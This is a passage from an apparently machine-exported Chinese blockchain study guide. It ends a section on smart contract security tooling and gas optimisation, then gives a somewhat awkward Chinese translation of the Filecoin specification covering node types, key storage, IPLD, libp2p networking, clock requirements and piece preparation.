的插件，通过可视化的方式辅助分析合约。建议使用时换成它自定义的主题，可能显示效果会好一些。使用方法请看标题的官方网站，介绍的很清楚，也有动图演示。\n安全实践\n了解常见的安全漏洞\n以上列出了一些合约漏洞，对此需要有一定的了解。\n请熟悉 EIP-1470 提出的漏洞分类\n学会使用安全工具\n首先，有一个很棒的社区的总结《以太坊智能合约 —— 最佳安全开发指南》，强烈建议仔细阅读，虽然有部分内容可能过时了，但是仍然很有参考意义\n其次，对合约进行单元测试，truffle 使用Mocha测试框架和Chai进行断言，也要测试前端 DApp 将如何调用合约。\n\n从 Trufflev5.1.0开始，您可以中断测试以调试测试流程并启动调试器，允许您设置断点、检查 Solidity 变量等。\n然后，使用合约审计工具，如Mythril 和Slither 等，可以使用 solidity-coverage 检查测试的覆盖性。\n使用开源的合约库\n开源合约库经过严格的安全审查，很多项目依赖他们，一般而言比较可靠。\ncontracts 提供了常见的合约库，实现了一些标准库，如 ERC20、ERC721，仓库中可阅读源码。\n\ndappsys 是一个新兴的合约库，用法参见文档文档\n\n深入字节码分析\n这一部分将会在 以太坊设计原理中深入探讨。\n合约优化\n在保证合约安全的前提下，优化合约往往是指优化 gas。合约消耗的 gas 主要由两部分组成，每次执行和部署时的消耗。\n参考：\n\n\nSolidity Security: Comprehensive list of known attack vectors and common anti-patterns\nSmart Contract Weakness Classification Registry\n《智能合约安全分析和审计指南》王艺卓等\nEIP-1470 提出的 Smart Contract Weakness Classification Registry\n8 Ways of Reducing the Gas Consumption of your Smart Contracts\nsmart-contract-development-best-practices\nimmunefi.com/learn/\nThe Encyclopedia of Smart Contract Attacks and Vulnerabilities\n\n"},"blockchainguide/Decentralized_Storage/FileCoin/FileCoin技术文档":{"slug":"blockchainguide/Decentralized_Storage/FileCoin/FileCoin技术文档","filePath":"blockchainguide/Decentralized_Storage/FileCoin/FileCoin技术文档.md","title":"FileCoin技术文档","links":[],"tags":[],"content":"\n翻译自：spec.filecoin.io/#section-systems.filecoin_vm.interpreter\n\n1. 介绍\nFilecoin是一个基于区块链机制的分布式存储网络。Filecoin矿工可以选择为网络提供存储容量，从而通过定期生成加密证明来获得Filecoin加密货币(FIL)的单位，证明他们正在提供指定的容量。此外，Filecoin允许各方通过Filecoin区块链上的共享分类账记录的交易来交换Filecoin货币。然而，Filecoin并没有使用工作量证明来维护链上的共识，而是使用了存储证明本身:一个矿工在共识协议中的能力与它提供的存储量成比例。\nFilecoin区块链不仅维护Filecoin交易和账户的分类账本，还实现了Filecoin VM，这是一个可复制的状态机，在网络上的参与者之间执行各种加密合约和市场机制。这些合约包括存储交易，客户向矿工支付FIL货币，以换取存储客户请求的特定文件数据。通过Filecoin VM的分布式实现，存储交易和其他记录在链上的合约机制将随着时间的推移继续处理，而不需要原始各方(如请求数据存储的客户端)的进一步交互。\n1.2 架构图\nActor状态图：\n\n1.3 关键内容\n\nData structures是带有语义标记的数据成员(例如，结构、接口或枚举)的集合。\nFunction是不依赖于外部状态的计算过程(例如，数学函数或不引用全局变量的编程语言函数)\nComponents是一组功能，在实现结构中被表示为单个软件单元。根据语言和特定组件的选择，这可能对应于单个软件模块、运行主循环的线程或进程、磁盘支持的数据库或各种其他设计选择。例如，ChainSync是一个组件:它可以被实现为一个进程或线程运行单个指定的主循环，它等待网络消息，并通过记录和/或转发块数据来响应。\napi是将消息传递给组件的接口。一个给定子协议的客户端视图，例如向一个miner节点的Storage Provider组件请求在存储市场中存储文件，可能需要执行一系列的API请求。\nNodes是与协议交互的完整的软件和硬件系统。一个节点可能会不断地运行上述几个组件，参与多个子系统，并在本地和/或通过网络公开api，这取决于节点配置。术语“完整节点”是指运行上述所有组件并支持规范中详细描述的所有api的系统。\nSubsystems是整个Filecoin协议的概念划分，要么是按照完整的协议(如存储市场或检索市场)，要么是按照功能(如VM - Virtual Machine)。它们不一定对应于任何特定的节点或软件组件。\nActor是体现在Filecoin VM状态中的虚拟实体。协议参与者类似于智能合约的参与者;参与者携带FIL货币余额，并可以通过VM的操作与其他参与者交互，但并不一定对应于任何特定的节点或软件组件。\n\n1.4 FileCoin VM\nFilecoin的大多数用户所面对的功能(支付、存储市场、能量表等)是通过Filecoin虚拟机(Filecoin VM)管理的。该网络生成一系列区块，并同意哪个区块链是正确的。每个块包含一系列称为消息的状态转换，以及应用这些消息后的当前全局状态检查点。\n这里的全局状态由一组参与者（Actor）组成，每个参与者都有自己的私有状态。\n一个参与者是Filecoin等价于以太坊的智能合约，它本质上是Filecoin网络中的一个“对象”，具有状态和一组可以用来与之交互的方法。每个参与者都有一个Filecoin balance，一个状态指针，一个代码CID(告诉系统参与者是什么类型的参与者)，以及一个nonce(跟踪参与者发送的消息数量)。\n在参与者上调用方法有两种途径。首先，要作为系统的外部参与者(也就是使用Filecoin的普通用户)调用方法，您必须向网络发送一个签名消息，并向包含您的消息的矿工支付费用。消息上的签名必须与一个帐户相匹配，该帐户有足够的Filecoin来支付消息的执行费用。这里的费用相当于比特币和以太坊的交易费用，它与处理消息所做的工作成比例(比特币按字节为消息定价，以太坊使用“gas”的概念。我们也用gas)。\n其次，参与者可以在调用其方法之一的过程中调用另一个参与者的方法。然而，唯一可能发生这种情况的时候是某个参与者被外部用户消息调用的结果(注意:用户调用的参与者可能调用另一个参与者，然后调用另一个参与者，在执行能够承受的层次上尽可能多)。\n具体实现请参见虚拟机子系统。\n1.5 系统分解\n1.5.1 系统是什么，如何工作\nFilecoin将功能解耦并模块化到松散连接的系统中。每个系统都增加了重要的功能，通常是为了实现一组重要且紧密相关的目标。\n例如，区块链系统提供了块、Tipset和链等结构，并提供了块同步、块传播、块验证、链选择和链访问等功能。这与文件、片段、片段准备和数据传输是分开的。这两个系统都与市场分离，市场提供订单、交易、市场可见性和交易结算。\n1.5.1.1 为什么系统解耦有用?\n理由如下：\n\n**实施边界：**可以构建仅实施一部分系统的Filecoin实施。这对于实现多样性特别有用：我们需要许多安全关键系统（例如，区块链）的实现，但不需要许多可以分离的系统实现。\n**运行时解耦：**系统解耦使构建和运行将系统隔离到单独程序甚至单独物理计算机中的Filecoin节点变得更加容易。\n**安全隔离：**某些系统比其他系统需要更高的操作安全性。系统解耦使实现能够满足其安全性和功能性需求。一个很好的例子是将区块链处理与数据传输分开。\n**可伸缩性：**系统和各种用例可能会为不同的操作员带来不同的性能要求。系统解耦使运营商更容易沿着系统边界扩展其部署。\n\n1.5.1.2 FileCoin 节点不需要所有系统\n\n**实施边界：**可以构建仅实施一部分系统的Filecoin实施。这对于实现多样性特别有用：我们需要许多安全关键系统（例如，区块链）的实现，但不需要许多可以分离的系统实现。\n**运行时解耦：**系统解耦使构建和运行将系统隔离到单独程序甚至单独物理计算机中的Filecoin节点变得更加容易。\n**安全隔离：**某些系统比其他系统需要更高的操作安全性。系统解耦使实现能够满足其安全性和功能性需求。一个很好的例子是将区块链处理与数据传输分开。\n**可伸缩性：**系统和各种用例可能会为不同的操作员带来不同的性能要求。系统解耦使运营商更容易沿着系统边界扩展其部署。\n\n1.5.1.3 分离系统\n\n我们如何确定一个系统与另一个系统属于什么功能？\n\n在系统之间划定界限是将紧密相关的功能与无关部分分开的技术。从某种意义上说，我们寻求将紧密集成的组件保留在同一系统中，并远离其他无关的组件。有时这很简单，边界自然是来自数据结构或功能。例如，很容易观察到，客户和矿工彼此协商交易与VM执行非常无关。\n有时这比较困难，并且需要整理，添加或删除抽象。例如，StoragePowerActor和和以前StorageMarketActor是单个Actor。这导致了整个StorageDeal生产StorageMarket市场，存储市场，部门密封，PoSt生成等功能之间的巨大耦合。纠结这两组相关功能需要将一个参与者分成两个。\n1.5.1.4 在系统内部分解\n系统本身分解为较小的子单元。这些有时称为“子系统”，以避免与更大的一流系统混淆。子系统本身可能会进一步崩溃。此处的命名未严格执行，因为这些细分与协议和实现工程方面的问题相比，与用户功能更相关。\n1.5.2 实现系统\n1.5.2.1 系统要求\n为了更轻松地将功能分离到系统中，Filecoin协议假定了一组可用于所有系统的功能。此功能可以通过各种方式的实现来实现，并且应将此处的指南作为建议（应该）。\n本文档中定义的所有系统都要求具备以下条件：\n\n仓库：\n\n**本地的IpldStore。**用于数据结构（小型结构化对象）的一定数量的持久本地存储。系统期望使用IpldStore进行初始化，在该系统中存储它们希望在崩溃中持续存在的数据结构。\n**用户配置值。**少量用户可编辑的配置值。这些应该使最终用户易于访问，查看和编辑。\n**本地，安全KeyStore。**用于生成和使用加密密钥的工具，必须对Filecoin节点保密。系统不应直接访问密钥，而应通过KeyStore提供加密，解密，签名，SigVerify等功能的抽象（即）进行访问。\n\n\n**本地的FileStore。**某些文件的持久本地存储（大字节数组）。系统期望使用存储大文件的FileStore进行初始化。某些系统（例如Markets）可能需要存储和删除大量较小的文件（1MB-10GB）。其他系统（例如存储挖掘）可能需要存储和删除大量大文件（1GB-1TB）。\n**网络。**大多数系统需要访问网络，才能连接到其他Filecoin节点中的对应系统。系统期望使用可libp2p.Node在其上安装自己的协议的进行初始化。\n**时钟。**有些系统需要访问当前的网络时间，而有些系统的漂移容差较低。系统期望使用一个时钟来初始化，以从中得知网络时间。一些系统（如区块链）需要很少的时钟漂移，并且需要安全的时间。\n\n为此，我们使用FilecoinNode数据结构，该数据结构在初始化时传递给所有系统。\n1.5.2.2系统限制\n此外，系统必须遵守以下限制：\n\n**随机崩溃。**Filecoin节点可能随时崩溃。通过崩溃，系统必须是安全且一致的。这主要是通过限制持久状态的使用，通过Ipld数据结构持久化这种状态，以及通过使用检查状态的初始化例程以及可能纠正错误来实现的。\n**隔离。**系统必须通过定义良好的隔离接口进行通信。他们不得在共享内存空间上构建关键功能。（注意：为了提高性能，共享内存抽象可用于为IpldStore，FileStore和libp2p供电，但是系统本身不应该需要它。）它还显着简化了协议，并使其更易于理解，分析，调试和更改。\n**无法直接访问主机操作系统文件系统或磁盘。**系统无法直接访问磁盘，而是通过FileStore和IpldStore抽象来进行。这将为最终用户（尤其是存储矿工和大量数据的客户端）提供高度的可移植性和灵活性，这需要能够轻松替换其Filecoin节点访问本地存储的方式。\n**不能直接访问主机OS网络堆栈或TCP / IP。**系统无法直接访问网络-它们通过libp2p库进行访问。不得有任何其他类型的网络访问。这提供了跨平台和网络协议的高度可移植性，使Filecoin节点（及其所有关键系统）可以使用各种协议（例如蓝牙，LAN等）在多种设置下运行。\n\n2. 系统\n在本节中，我们将逐一详细说明所有系统组件，以提高其复杂性和/或与其他系统组件的相互依赖性。组件之间的交互仅在适当的地方简要讨论，但总体工作流程在“简介”部分给出。特别是，在本节中，我们讨论：\n\nFilecoin节点：参与Filecoin网络的不同类型的节点，以及这些节点运行的重要部分和过程，例如密钥库和IPLD存储，以及libp2p的网络接口。\n文件和数据：Filecoin的数据单位，例如“部门”和“碎片”。\n虚拟机：Filecoin VM的子组件，例如参与者，即在Filecoin区块链上运行的智能合约和状态树。\n区块链：Filecoin区块链的主要构建块，例如消息和块的结构，消息池，以及节点首次加入网络时如何同步区块链。\n令牌：钱包所需的组件。\n存储挖掘：存储挖掘的详细信息，存储能力共识以及存储矿工如何证明存储（不涉及证明的细节，这将在后面讨论）。\n市场：存储和检索市场，主要是脱链的过程，但对于分散存储市场的平稳运行非常重要。\n\n2.1 Filecoin节点\n本节首先讨论Filecoin节点的概念。尽管在Filecoin的Lotus实现中不像在其他区块链网络中那样严格定义不同的节点类型，但是不同类型的节点应该实现不同的属性和功能。简而言之，基于节点提供的服务集对其进行定义。\n在本节中，我们还将讨论与在Filecoin节点中存储系统文件有关的问题。请注意，在本节中，通过存储，我们不是指节点为在网络中进行挖掘而提交的存储，而是指它需要可用于密钥和IPLD数据的本地存储库。\n在本节中，我们还将讨论网络接口以及节点之间如何查找和连接，如何使用libp2p交互和传播消息以及如何设置节点的时钟。\n2.1.1节点类型\nFilecoin网络中的节点主要根据其提供的服务进行标识。因此，节点的类型取决于节点提供的服务。Filecoin网络中的一组基本服务包括：\n\n链验证\n仓储市场客户\n存储市场提供商\n检索市场客户\n检索市场提供者\n仓储采矿\n\n参与Filecoin网络的任何节点都应至少提供链验证服务。根据节点在链验证之上提供的额外服务，它会获得相应的功能和节点类型“标签”。\n可以使用主机中的存储库（目录）以一对一关系实现节点-即，一个存储库属于单个节点。也就是说，一台主机可以通过具有相应的存储库来实现多个Filecoin节点。\nFilecoin实现可以支持以下子系统或节点类型：\n\n链验证器节点：这是节点加入Filecoin网络所需的最低功能。除非实现以下所述的客户端节点功能，否则这种类型的节点无法在网络中发挥积极作用。链验证器节点首次加入网络时必须同步链（ChainSync），以达成当前共识。从那时起，该节点必须不断获取链中的任何附加内容（即，接收最新的块）并验证它们是否达到共识状态。\n客户端节点：这种类型的节点建立在Chain Verifier节点之上，并且必须由Filecoin网络上构建的任何应用程序来实现。可以将其视为基于Filecoin的应用程序（例如交易所或分散存储应用程序）的主要基础结构节点（至少就与区块链的交互而言）。该节点应实现存储市场和检索市场客户服务。客户端节点应与存储和检索市场进行交互，并能够通过数据传输模块进行数据传输。\nRetrieval Miner Node（检索矿工节点）：此节点类型扩展了Chain Verifier节点以添加检索矿工功能，即参与了检索市场。这样，此节点类型需要实现检索市场提供者服务，并能够通过数据传输模块进行数据传输。\n**Storage Miner Node：**这种类型的节点必须实现验证，创建和添加块以扩展区块链所需的所有必需功能。它应实施链验证，存储挖掘和存储市场提供商服务，并能够通过数据传输模块进行数据传输。\n\n2.1.1.1 节点接口\n可以在此处找到Node接口的Lotus实现 。\n2.1.1.2链验证器节点\ntype ChainVerifierNode interface {\n  FilecoinNode\n \n  systems.Blockchain\n}\n可以在这里找到Chain Verifier Node的Lotus实现 。\n2.1.1.3客户端节点\ntype ClientNode struct {\n  FilecoinNode\n \n  systems.Blockchain\n  markets.StorageMarketClient\n  markets.RetrievalMarketClient\n  markets.DataTransfers\n}\n客户端节点的Lotus实现可以在这里找到 。\n2.1.1.4存储矿工节点\ntype StorageMinerNode interface {\n  FilecoinNode\n \n  systems.Blockchain\n  systems.Mining\n  markets.StorageMarketProvider\n  markets.DataTransfers\n}\n可以在此处找到Storage Miner Node的Lotus实现 。\n2.1.1.5检索矿工节点\ntype RetrievalMinerNode interface {\n  FilecoinNode\n \n  blockchain.Blockchain\n  markets.RetrievalMarketProvider\n  markets.DataTransfers\n}\n2.1.1.6中继节点\ntype RelayerNode interface {\n  FilecoinNode\n \n  blockchain.MessagePool\n}\n2.1.1.7节点配置\n可以在此处找到Filecoin Node配置值的Lotus实现 。\n2.1.2节点存储库\nFilecoin节点存储库只是系统和链数据的本地存储。它是任何功能性Filecoin节点需要在本地存储以便正确运行的数据的抽象。\n该存储库可供节点的系统和子系统访问，并且可以从节点的存储区分开FileStore。\n该存储库存储节点的密钥，有状态对象的IPLD数据结构以及节点配置设置。\nFileStore存储库的Lotus实现可以在这里找到 。\n2.1.2.1密钥库\n这Key Store是任何完整Filecoin节点中的基本抽象，用于存储与给定矿工的地址（请参阅下面的实际定义）和不同的工作程序（矿工应该选择运行多个工作程序）关联的密钥对。\n节点安全性在很大程度上取决于保持这些密钥的安全性。为此，我们强烈建议：1）将密钥与所有子系统分开，2）根据其他子系统的要求使用单独的密钥存储来签署请求，以及3）保留未用作冷库中挖掘的那些密钥。\nFilecoin存储矿工依赖三个主要组成部分：\n\n在调用registerMiner()Storage Power Consensus子系统后，将存储矿工参与者*地址唯一地分配给给定的存储矿工**参与者*地址。实际上，存储矿工本身没有地址，而是由与其绑定的参与者的地址来标识的。这是给定存储矿工的唯一标识符，其电源和其他密钥将与之关联。该actor value指定一个已经创建的矿工演员的地址。\n所有者密钥对由矿工在注册之前提供，并且其公钥与矿工地址相关。所有者密钥对可用于管理矿工和提取资金。\n工人密钥对是与存储矿工参与者地址关联的公共密钥。可由矿工选择和更改。辅助密钥对用于签名块，也可以用于签名其他消息。鉴于它是可验证随机函数的一部分，它必须是BLS密钥对 。\n\n多个存储矿工参与者可以共享一个所有者公共密钥，也可以共享一个工人公共密钥。\n在Storage Miner Actor中指定了更改链上工作程序密钥对（即与存储矿工actor关联的工作人员Key）的过程 。请注意，这是一个两步过程。首先，矿工通过向链发送消息来进行更改。然后，矿工在随机回溯时间之后确认密钥更改。最后，在额外的随机回溯时间之后，矿工将开始使用新密钥对块进行签名。存在此延迟是为了防止自适应密钥选择攻击。\n密钥安全在Filecoin中至关重要，每个区块链中的密钥也是如此。无法安全地存储和使用密钥或将私钥暴露给对手可能会导致对手有权使用矿工的资金。\n2.1.2.2IPLD商店\n星际链接数据（IPLD）是一组库，这些库允许跨不同分布式系统和协议的内容寻址数据结构互操作。它为原始密码哈希提供了一种基本的“通用语言”，使数据结构可以在两个独立的协议之间被可验证地引用和检索。例如，用户可以在以太坊交易或智能合约中引用IPFS目录。\nFilecoin节点的IPLD存储是用于散列链接数据的本地存储。\nIPLD基本上由三层组成：\n\n块层，着重于块格式和寻址，块如何广告或自描述其编解码器\n数据模型层，它定义了一组必须包含在任何实现中的必需类型-下文将详细讨论。\n模式层，它允许扩展数据模型以与更复杂的结构进行交互，而无需自定义转换抽象。\n\n有关IPLD的更多详细信息，请参见其 规范。\n2.1.2.2.1数据模型\nIPLD的核心是定义用于表示数据的 数据模型。数据模型旨在通过各种编程语言进行实际实现，同时保持对内容寻址数据的可用性以及与该数据交互的各种通用工具。\n数据模型包括一系列标准基本类型（或“种类”），例如布尔，整数，字符串，空值和字节数组，以及两种递归类型：列表和映射。由于IPLD是为内容寻址数据而设计的，因此IPLD在其数据模型中还包含“链接”原语。实际上，链接使用 CID规范。IPLD数据被组织为“块”，其中一个块由原始编码数据及其内容地址或CID表示。每个内容可寻址的数据块都可以表示为一个块，并且块可以一起形成一个相干图或 Merkle DAG。\n应用程序通过数据模型与IPLD交互，而IPLD通过一组编解码器处理编组和解组。IPLD编解码器可能支持完整的数据模型或部分数据模型。支持完整数据模型的两个编解码器是 DAG-CBOR和 DAG-JSON。这些编解码器分别基于CBOR和JSON序列化格式，但包括允许它们封装IPLD数据模型（包括其链接类型）的规范化以及可在任何数据集及其各自的内容地址（或哈希摘要）。这些规则包括在对地图进行编码时对键的特定顺序进行规定，或者在存储时对整数类型进行大小调整。\n2.1.2.2.2 Filecoin中的IPLD\nFilecoin网络中有两种方式使用IPLD：\n\n所有系统数据结构都使用DAG-CBOR（IPLD编解码器）存储。DAG-CBOR是CBOR的更严格子集，具有预定义的标记方案，旨在存储，检索和遍历散列链接的数据DAG。与CBOR相比，DAG-CBOR可以保证确定性。\nFilecoin网络上存储的文件和数据也使用各种IPLD编解码器（不一定是DAG-CBOR）进行存储。\n\nIPLD在数据上方提供了一致且一致的抽象，从而使Filecoin可以构建复杂的多块数据结构（例如HAMT和AMT）并与之交互。Filecoin使用DAG-CBOR编解码器对其数据结构进行序列化和反序列化，并使用IPLD数据模型与该数据进行交互，并在此模型上构建了各种工具。IPLD选择器还可用于寻址链接数据结构中的特定节点。\n2.1.2.2.2.1IpldStores\nFilecoin网络主要依赖于两个不同的IPLD GraphStore：\n\n一种ChainStore存储区块链的数据，包括块头，相关消息等。\n一种StateStore存储来自给定stateTree区块链的有效负载状态，或者存储由Filecoin VM应用于给定状态的给定链中所有块消息的 结果。\n\n的ChainStore是通过从他们的同辈节点中的引导阶段下载 链同步，并且由节点此后被存储。每次接收到新的块时，或者节点同步到新的最佳链时，它都会更新。\n的StateStore是通过在给定的所有块消息的执行计算ChainStore，并且由节点此后被存储。VM解释器会使用每个新传入块的处理对其进行更新 ，并相应地由在块标题 ParentState字段中在其上方生成的新块进行引用 。\n2.1.3 网络接口\nFilecoin节点使用libp2p网络堆栈的几种协议来进行对等方发现，对等方路由以及块和消息传播。Libp2p是用于点对点网络的模块化网络堆栈。它包括多种协议和机制，可实现高效，安全和有弹性的对等通信。Libp2p节点彼此之间打开连接，并在同一连接上安装不同的协议或流。在最初的握手中，节点交换它们各自支持的协议，所有与Filecoin相关的协议都将安装在/fil/...协议标识符下。\nlibp2p的完整规范可以在github.com/libp2p/specs中找到 。这是Filecoin使用的libp2p协议的列表。\n\nGraphsync： Graphsync是一种用于在对等点之间同步图的协议。它用于在Filecoin节点之间引用，寻址，请求和传输区块链和用户数据。所述 GraphSync的草案规范提供的概念，接口和由GraphSync使用的网络消息的更多细节。协议ID没有Filecoin特定的修改。\n**Gossipsub：**使用基于Gossip的pubsub协议（缩写为*GossipSub），*通过Filecoin网络传播块头和消息。与传统的pubsub协议一样，节点订阅主题并接收在这些主题上发布的消息。当节点从其订阅的主题接收消息时，它们将运行验证过程，并且i）将消息传递给应用程序； ii）将消息进一步转发给他们知道已订阅同一主题的节点。此外，FileCoin中使用的GossipSub v1.1版本通过安全机制进行了增强，该机制使协议可以抵御安全攻击。该 GossipSub规格提供有关其设计和实现的所有协议详细信息，以及协议参数的特定设置。尚未对协议ID进行filecoin的特定修改。但是话题标识必须是形式fil/blocks/&lt;network-name&gt;和fil/msgs/&lt;network-name&gt;\nKademlia DHT： Kademlia DHT是一个分布式哈希表，在特定节点的最大查找数上具有对数范围。在Filecoin网络中，Kademlia DHT主要用于对等发现和对等路由。特别是，当一个节点想要在Filecoin网络中存储数据时，它们会获得一个矿工列表及其节点信息。该节点信息（除其他外）包括矿工的PeerID。为了连接到矿工并交换数据，想要在网络中存储数据的节点必须找到矿工的多地址，他们通过查询DHT来实现。所述 libp2p喀DHT规范提供了DHT结构的实现细节。对于Filecoin网络，协议ID的格式必须为fil/&lt;network-name&gt;/kad/1.0.0。\n**引导程序列表：**这是新节点在加入网络后尝试连接的节点列表。引导节点列表及其地址由用户（即应用程序）定义。\n**对等交换：**此协议是在Kademlia DHT上面讨论的对等发现过程的实现。通过与DHT进行接口，它使对等点可以找到网络中其他对等点的信息和地址，并为要连接的对等点创建和发出查询。\n\n2.1.4时钟\nFilecoin假定系统参与者之间的时钟同步较弱。也就是说，系统依赖于参与者可以访问全局同步时钟（允许某些有界偏移）。\nFilecoin依靠此系统时钟来确保共识。具体来说，时钟是支持验证规则所必需的，验证规则可防止块生产者使用协议的时间戳来挖掘具有未来时间戳的块并更频繁地运行领导者选举。\n2.1.4.1时钟用途\n使用Filecoin系统时钟：\n\n通过同步节点来验证传入块是否在给定时间戳的适当纪元内被挖掘（请参见 块验证）。这是可能的，因为系统时钟始终将时间映射到唯一的纪元号，该纪元号完全由创世块中的开始时间确定。\n通过同步节点以放置来自未来纪元的数据块\n通过允许节点在下一轮尝试领导者选举（如果在当前轮中没有人产生阻碍的情况下）来挖掘节点，以保持协议的活跃性（请参阅 存储电源共识）。\n\n为了允许矿工执行上述操作，系统时钟必须：\n\n相对于其他节点具有足够低的偏移量，以使从其他节点的角度来看，不会在被认为是未来纪元的纪元中开采区块（这些区块直到根据验证规则的正确纪元/时间才被 验证）。\n设置节点初始化的时期数等于 epoch = Floor[(current_time - genesis_time) / epoch_time]\n\n预计其他子系统将从NewRound()时钟子系统注册到事件。\n2.1.4.2时钟要求\n用作Filecoin协议一部分的时钟应保持同步，且偏移小于1秒，以便进行适当的验证。\n预计计算机级晶体的偏差为 1ppm（即每秒1微秒，或每周0.6秒）。因此，为了遵守上述要求：\n\n节点应运行NTP守护程序（例如timesyncd，ntpd，chronyd），以使其时钟与一个或多个可靠的外部引用保持同步。\n\n我们建议以下来源：\n\npool.ntp.org（ 详细）\ntime.cloudflare.com:1234（ 详细）\ntime.google.com（ 详细）\ntime.nist.gov（ 详细）\n\n\n\n\n较大的采矿作业可能会考虑使用具有GPS参考和/或频率稳定的外部时钟的本地NTP / PTP服务器，以改善计时功能。\n\n采矿业务有强烈的动机来防止时钟向前倾斜一个纪元以上，以防止块状提交被拒绝。同样，他们有动机防止时钟偏离一个以上的时间，以避免将自己与网络中的同步节点分开。\n2.2文件和数据\nFilecoin的主要目的是存储客户的文件和数据。本节详细介绍与处理文件，分块，编码，图形表示Pieces，，存储抽象等相关的数据结构和工具。\n2.2.1文件\n例：\n// Path is an opaque locator for a file (e.g. in a unix-style filesystem).\ntype Path string\n \n// File is a variable length data container.\n// The File interface is modeled after a unix-style file, but abstracts the\n// underlying storage system.\ntype File interface {\n    Path()   Path\n    Size()   int\n    Close()  error\n \n    // Read reads from File into buf, starting at offset, and for size bytes.\n    Read(offset int, size int, buf Bytes) struct {size int, e error}\n \n    // Write writes from buf into File, starting at offset, and for size bytes.\n    Write(offset int, size int, buf Bytes) struct {size int, e error}\n}\n2.2.1.1FileStore-文件的本地存储\n的FileStore是用来指任何底层系统或设备，其将Filecoin其数据存储到一个抽象。它基于Unix文件系统语义，并包含的概念Paths。在这里使用这种抽象是为了确保Filecoin的实现使最终用户可以轻松地使用适合他们需求的基础替换底层存储系统。最简单的版本FileStore只是主机操作系统的文件系统。\n例：\n// FileStore is an object that can store and retrieve files by path.\ntype FileStore struct {\n    Open(p Path)           union {f File, e error}\n    Create(p Path)         union {f File, e error}\n    Store(p Path, f File)  error\n    Delete(p Path)         error\n \n    // maybe add:\n    // Copy(SrcPath, DstPath)\n}\n2.2.1.1.1变化的用户需求\nFilecoin用户的需求差异很大，许多用户（尤其是矿工）将在Filecoin的下方和周围实施复杂的存储架构。FileStore这里的抽象是为了使这些变化的需求易于满足。Filecoin协议中的所有文件和扇区本地数据存储都是通过此FileStore接口定义的，这使实现易于实现可交换，并且使最终用户可以轻松选择所选择的系统。\n2.2.1.1.2实施实例\n该FileStore接口可以由多种后备数据存储系统来实现。例如：\n\n主机操作系统文件系统\n任何Unix / Posix文件系统\nRAID支持的文件系统\n联网的分布式文件系统（NFS，HDFS等）\nIPFS\n资料库\nNAS系统\n原始串行或块设备\n原始硬盘驱动器（hdd扇区等）\n\n实现应实现对主机OS文件系统的支持。实现可以实现对其他存储系统的支持。\n2.2.2文件币片\n该Filecoin片是主要的谈判单位为用户存储Filecoin网络上的数据。Filecoin Piece不是存储单位，它没有特定大小，但是受Sector大小的限制。Filecoin片段的大小可以任意，但是如果片段大于矿工支持的扇区的大小，则必须将其拆分成更多的片段，以使每个片段都适合一个扇区。\nAPiece是代表a的全部或一部分的对象，File由Storage Clients和Storage Miners在中使用Deals。Storage Clients租用Storage Miners存放Pieces。\nPiece数据结构用于证明存储任意IPLD图和客户端数据。该图显示了一个部件及其证明树的详细组成，包括完整的和带宽优化的部件数据结构。\n\n2.2.2.1数据表示\n重要的是要强调，提交给Filecoin网络的数据在经过转换之后才变成StorageProvider存储数据的格式。\n从用户开始准备要存储在Filecoin中的文件到提供者生成存储在一个部门中的所有作品标识符的过程，下面是过程。\n前三个步骤在客户端进行。\n\n当客户想要在Filecoin网络中存储文件时，他们首先生成文件的IPLD DAG。表示DAG根节点的哈希是IPFS样式的CID，称为有效负载CID。\n为了制作Filecoin Piece，IPLD DAG被序列化为 “ Content-Addressable aRchive”（。car）文件，该文件为原始字节格式。CAR文件是一个不透明的数据块，可打包在一起并传输IPLD节点。该有效载荷CID是CAR’ed和未CAR’ed结构之间常见。当稍后在存储客户端和存储提供者之间传输数据时，这将在稍后的数据检索期间有所帮助。\n生成的.car文件用额外的零位填充，以使该文件形成二进制Merkle树。为了获得干净的二进制Merkle树，.car文件的大小必须为2（^ 2）的幂。填充过程称为Fr32 padding，将每256位中的254位中的两（2）个零位加到输入文件中。下一步，填充过程获取过程的输出，Fr32 padding并找到其上方的大小，从而得到2的幂。Fr32 padding下一个2的幂次方的结果之间的差距用零填充。\n\n为了说明这些步骤背后的原因，重要的是了解StorageClient和之间的总体谈判过程StorageProvider。CID或CommP是客户与存储提供商协商并同意的交易中包含的内容。达成协议后，客户端将文件发送给提供者（使用GraphSync）。提供者必须从接收到的文件中构造出CAR文件，并从其一侧导出Piece CID。为了避免客户向商定的文件发送不同的文件，提供者生成的件CID必须与先前协商的交易中包含的文件CID相同。\n以下步骤在StorageProvider一侧进行（除了步骤4，也可以在客户端进行）。\n\n一旦StorageProvider接收到来自客户端的文件，他们就会从Piece的哈希值（填充的.car文件）中计算出Merkle根。干净的二叉树Merkle树的结果根是Piece CID。这也称为CommP或计件承诺，如前所述，必须与交易中包含的承诺相同。\n该部分与其他交易的数据一起包含在一个部门中。在StorageProvider随后计算所有部门内件梅克尔根。该树的根是CommD（又称数据承诺或UnsealedSectorCID）。\n所述StorageProvider然后密封该扇区并且将所得梅克尔根的根是CommRLast。\n特别是复制证明（PoRep），特别是SDR，会生成另一个名为CommC的Merkle根哈希，以证明已正确执行了承诺为CommD的数据的复制。\n最后，CommR（或复制承诺）是CommC的哈希。CommRLast。\n\n重要笔记：\n\nFr32是字段元素的32位表示形式（在我们的情况下为BLS12-381的算术字段）。为了格式正确，类型值Fr32必须实际上适合该字段，但是类型系统不强制执行该值。它是不变量，必须正确使用才能保留。在所谓的情况下Fr32 padding，两个零位被插入到一个“需要”最多254位才能表示的数字之后。这保证了结果将为Fr32，而不管初始254位的值如何。这是一种“保守”技术，因为对于某些初始值，实际上只需要一点零填充。\n上面的步骤2和3是特定于Lotus实现的。可以通过不同的方式来实现相同的结果，例如，无需使用Fr32位填充。但是，任何实现都必须确保对初始IPLD DAG进行了序列化和填充，以便提供干净的二叉树，因此，从所得数据斑点中计算出Merkle根时，将得到相同的Piece CID。只要是这种情况，实现可能会偏离上面的前三个步骤。\n最后，重要的是添加与有效载荷CID（在上面的前两个步骤中讨论过）和数据检索过程有关的注释。检索交易根据有效负载CID进行协商。达成检索协议后，检索矿工将开始将未密封和“未CAR’ed”的文件发送给客户端。传输从IPLD Merkle树的根节点开始，这样客户端可以从传输开始就验证有效负载CID，并验证他们接收的文件是他们在交易中协商的文件，而不是随机位。\n\n2.2.2.2件商店\n该PieceStore模块允许从本地存储中存储和检索碎片。零配件商店的主要目标是帮助 存储和 检索市场模块查找密封数据在部门内部的位置。存储市场写入数据，而检索市场读取数据，以便发送给检索客户。\n在此处可以找到PieceStore模块的实现 